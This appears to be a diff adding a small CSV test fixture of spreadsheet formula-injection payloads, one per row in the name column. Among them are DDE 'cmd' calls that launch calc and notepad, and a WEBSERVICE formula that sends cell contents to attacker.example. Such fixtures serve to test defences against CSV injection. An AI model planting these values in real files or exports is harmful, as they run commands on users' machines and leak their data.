@@ -1,0 +1,7 @@
+name,phone,notes
+=HYPERLINK("http://evil.example","click"),+919899999901,pwn-row-1
+=cmd|' /C calc'!A0,+919899999902,pwn-row-2
+@SUM(1+1)*cmd|' /C notepad'!A0,+918811111103,pwn-row-3
+=WEBSERVICE("http://attacker.example/leak?d="&A2),+918811111104,pwn-row-4
+'+111111,+919899999905,apostrophe-payload
+=INDIRECT("A1"),+918811111106,pwn-row-6
